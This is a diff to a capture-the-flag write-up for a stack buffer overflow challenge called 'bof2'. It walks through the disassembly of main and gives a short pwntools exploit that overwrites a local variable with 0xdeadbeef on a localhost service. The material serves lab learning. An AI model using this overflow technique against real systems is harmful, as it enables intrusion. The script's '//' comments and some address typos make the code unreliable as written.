@@ -5,23 +5,30 @@ Then we open up the assembly in nano after using objdump to get an idea of the p
 
 Looking through main there are a few details that catch my eye in this block.
 
+```asm
      80484b9:       83 ec 54                sub    esp,0x54
      80484bc:       c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0
      80484c3:       83 ec 08                sub    esp,0x8
 
+```
 The first line you see that it subtracts 0x54 (84 bytes) from esp to create room for variables. Then we create a variable at the address of ebp-0xc (12 bytes) and store the value of 0. *Make sure to keep track of the stack, it helps to physically draw it as you go sometimes.* It then subtracts 0x8 (8 bytes) from esp, which in this problem will not matter to us.
 
-    80484c6:       8d 45 b4                lea    eax,[ebp-0x4c]
-    80484c9:       50                      push   eax
-    80484ca:       68 c0 85 04 08          push   0x80485c0
-    80484cf:       e8 cc fe ff ff          call   80483a0 <isoc99_scanf@plt>
+```asm
+80484c6:       8d 45 b4                lea    eax,[ebp-0x4c]
+80484c9:       50                      push   eax
+80484ca:       68 c0 85 04 08          push   0x80485c0
+80484cf:       e8 cc fe ff ff          call   80483a0 <isoc99_scanf@plt>
 
+```
 The next block of code to jump out should be the scanf function and the parameters it calls that precede it. The first line loads in the address of ebp-0x4c into the eax register and then pushes eax to the top of the stack which indicated that it is being used as a parameter to scanf. The third line is pushing a second parameter onto the stack, if in GDB you can use `x 0x80456c0` to find the value of that address which turns out to be `%s`. Then finally the function is called with the parameters and thus the string we input into the buffer gets stored in the address of ebp-0x4c.
 
 Since this is a buffer overflow problem we can expect to find some sort of value for us to overwrite, meaning there is an address above [epb-0x4c] that we need to overflow.
 
-    80484d7:       81 7d f4 ef be ad de    cmp    DWORD PTR [ebp-0xc],0xdeadbeef
-    80484de:       74 1a                   je     80484fa <main+0x4f>
+```asm
+80484d7:       81 7d f4 ef be ad de    cmp    DWORD PTR [ebp-0xc],0xdeadbeef
+80484de:       74 1a                   je     80484fa <main+0x4f>
+```
+
 
 Here is the compare we want to make true, it compares the value in the address of [ebp-0xc] to 0xdeadbeef and jumps if it is equal.
 
@@ -39,14 +46,16 @@ With a buffer overflow we need to overwrite 0xC with the value 0xdeadbeef, in or
 
 Here is our exploit:
 
-    from pwn import *
+```py
+  from pwn import *
 
-    conn = remote('127.0.0.1', 6666)
+  conn = remote('127.0.0.1', 6666)
 
-    payload = 64 * 'a'  // Fill the buffer of 64 bytes to each 0xC
-    payload += p32(0xdeadbeef) // Append 0xdeadbeef using little endian with p32
+  payload = 64 * 'a'  // Fill the buffer of 64 bytes to each 0xC
+  payload += p32(0xdeadbeef) // Append 0xdeadbeef using little endian with p32
 
-    conn.send(payload)  // Send payload over the connection
-    conn.interactive() // Cool fancy shell function
+  conn.send(payload)  // Send payload over the connection
+  conn.interactive() // Cool fancy shell function
 
+```
 Then you have pwned bof2! Get better.
